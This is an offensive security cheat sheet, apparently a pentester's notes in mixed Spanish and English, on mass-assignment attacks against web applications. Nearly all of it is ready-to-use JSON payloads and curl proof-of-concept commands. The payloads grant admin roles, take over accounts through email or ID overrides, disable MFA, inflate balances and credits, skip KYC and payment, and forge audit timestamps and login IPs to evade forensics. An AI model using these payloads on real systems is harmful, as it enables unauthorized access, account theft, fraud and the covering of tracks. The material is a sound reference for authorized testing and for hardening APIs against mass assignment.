---
aliases:
  - Mass Assignment Privesc
  - Mass Assignment ATO
  - Mass Assignment Financial
tags:
  - type/cheatsheet
  - vuln/mass-assignment
  - technique/privilege-escalation
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Mass Assignment]]'
---
# Mass Assignment - Vectores Comunes

***

## Privilege Escalation

| **Field target** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `isAdmin` boolean | `{"isAdmin": true}` | Most classic vector. |
| `is_admin` snake_case | `{"is_admin": true}` | Python/Ruby convention. |
| `admin` simple | `{"admin": true}` | Some apps use short form. |
| `role` string | `{"role": "admin"}` / `"administrator"` / `"superadmin"` / `"root"` | Variants per app. |
| `roles` array | `{"roles": ["admin", "user"]}` | Multi-role. |
| `permissions` array | `{"permissions": ["*"]}` o `["read", "write", "delete"]` | Granular. |
| `is_superuser` (Django) | `{"is_superuser": true}` | Django default flag. |
| `is_staff` (Django) | `{"is_staff": true}` | Django admin access. |
| `groups` array | `{"groups": ["admins"]}` | LDAP-style. |
| `tier` / `plan` | `{"tier": "enterprise"}` / `"plan": "premium"` | Bypass paywall. |
| `subscription` | `{"subscription": "lifetime"}` | Same. |
| `level` | `{"level": 99}` | Numeric privesc. |
| `access_level` | `{"access_level": "admin"}` | Granular. |
| `userType` | `{"userType": "ADMIN"}` | Enum. |
| `scope` (OAuth-style) | `{"scope": "admin read write"}` | OAuth scope inj. |
^ma-vector-privesc

### PoC privilege escalation

```bash
# Self-register con admin field
curl -X POST https://target/api/signup \
  -H "Content-Type: application/json" \
  -d '{
    "email": "atacante@evil.com",
    "password": "P@ssw0rd",
    "name": "User",
    "isAdmin": true,
    "role": "admin"
  }'

# Login + verify privesc
curl -X POST https://target/api/login \
  -d '{"email":"atacante@evil.com","password":"P@ssw0rd"}'
# Response: {token: "..."}

curl https://target/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
# Si 200 → privesc successful
```

___

## Account Takeover

| **Field target** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `id` / `_id` | `{"id": 1}` / `{"_id": 1}` | Take over user 1 (admin). |
| `user_id` | `{"user_id": 1}` | Same. |
| `email` (override) | `{"email": "victim@target.com"}` | Email-based ATO. |
| `username` | `{"username": "admin"}` | Username swap. |
| `phone` | `{"phone": "+1...victim_phone"}` | Phone linking abuse. |
| `password_hash` | `{"password_hash": "$2b$10$<known>"}` | Set known hash. |
| `password_reset_token` | `{"password_reset_token": "ATTACKER_TOKEN"}` | Generate own token. |
| `mfa_secret` | `{"mfa_secret": "BASE32SECRET"}` | Atacante controls 2FA. |
| `api_key` | `{"api_key": "atacante_api_key"}` | Pre-set API access. |
| `oauth_id` | `{"oauth_id": "victim_google_id"}` | Federated identity hijack. |
| `external_id` | `{"external_id": "victim_external"}` | Cross-system link. |
| `verified_email` boolean | `{"email_verified": true}` | Skip verification. |
| `phone_verified` | `{"phone_verified": true}` | Same. |
| `mfa_enabled` reset | `{"mfa_enabled": false}` | Disable 2FA. |
| Linked accounts | `{"linked_accounts":[...]}` | Override links. |
^ma-vector-ato

### Email-based ATO

```bash
# Backend: PUT /api/profile updates user fields
# Si backend permite email change sin re-confirmation ni old password:

curl -X PUT https://target/api/profile \
  -H "Authorization: Bearer $MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "victim@target.com",
    "email_verified": true
  }'

# Then password reset → email goes to atacante's inbox? No — sent to "new" email
# But atacante NOW owns the email field of own user → identity hijack
```

___

## Financial / Quota Fields

| **Field target** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `balance` | `{"balance": 99999999}` | Direct credit. |
| `credits` | `{"credits": 99999999}` | App credits / points. |
| `points` | `{"points": 99999999}` | Loyalty points. |
| `tokens` | `{"tokens": 99999999}` | App tokens. |
| `wallet` | `{"wallet": 99999999}` | Wallet balance. |
| `tier` paid | `{"tier": "enterprise"}` | Paywall bypass. |
| `subscription_status` | `{"subscription_status": "active"}` | Skip payment. |
| `subscription_expires_at` | `{"subscription_expires_at": "2099-12-31"}` | Extend. |
| `trial_extended` | `{"trial_extended": true}` | Bypass trial cap. |
| `quota_used` | `{"quota_used": 0}` | Reset usage counter. |
| `quota_limit` | `{"quota_limit": 99999999}` | Override limit. |
| `monthly_limit` | `{"monthly_limit": 99999999}` | Same. |
| `discount` | `{"discount": 100}` | Force max discount. |
| `tax_rate` | `{"tax_rate": 0}` | No tax. |
| `referral_credit` | `{"referral_credit": 99999999}` | Referral abuse. |
^ma-vector-financial

___

## Status Flags

| **Field target** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `is_active` | `{"is_active": true}` | Activate disabled account. |
| `is_verified` | `{"is_verified": true}` | Skip email verify. |
| `email_verified` | `{"email_verified": true}` | Same. |
| `phone_verified` | `{"phone_verified": true}` | Phone verify skip. |
| `mfa_enabled` | `{"mfa_enabled": false}` | Disable 2FA. |
| `mfa_setup_complete` | `{"mfa_setup_complete": false}` | Reset. |
| `kyc_verified` | `{"kyc_verified": true}` | Skip KYC. |
| `is_blocked` | `{"is_blocked": false}` | Unblock self. |
| `is_banned` | `{"is_banned": false}` | Unban. |
| `password_change_required` | `{"password_change_required": false}` | Skip forced change. |
| `force_logout` | `{"force_logout": false}` | Persist session. |
| `terms_accepted` | `{"terms_accepted": true}` | Skip ToS. |
| `tutorial_completed` | `{"tutorial_completed": true}` | Skip onboarding. |
| `is_public` (visibility) | `{"is_public": true}` | Visibility hijack. |
| `notifications_enabled` | `{"notifications_enabled": false}` | Annoyance / silent attack. |
^ma-vector-status

___

## Audit Fields (Backdating / Cover Tracks)

| **Field target** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `created_at` | `{"created_at": "1970-01-01T00:00:00Z"}` | Backdate creation. |
| `updated_at` | `{"updated_at": "..."}` | Forge update timestamp. |
| `deleted_at` | `{"deleted_at": null}` | Restore soft-deleted. |
| `created_by` | `{"created_by": 1}` | Forge author. |
| `modified_by` | `{"modified_by": 1}` | Forge modifier. |
| `version` | `{"version": 1}` | Optimistic lock bypass. |
| `revision` | `{"revision": 0}` | Reset revision. |
| `audit_log_id` | `{"audit_log_id": null}` | Detach audit. |
| `last_login_ip` | `{"last_login_ip": "127.0.0.1"}` | Forge login IP. |
| `last_login_at` | `{"last_login_at": "..."}` | Forge login time. |
| `seen_at` / `viewed_at` | Forge view timestamps | Edge. |
| `ip_address` | `{"ip_address": "127.0.0.1"}` | Internal trust. |
| `user_agent` | Forge UA | Forensics evasion. |
^ma-vector-audit

***
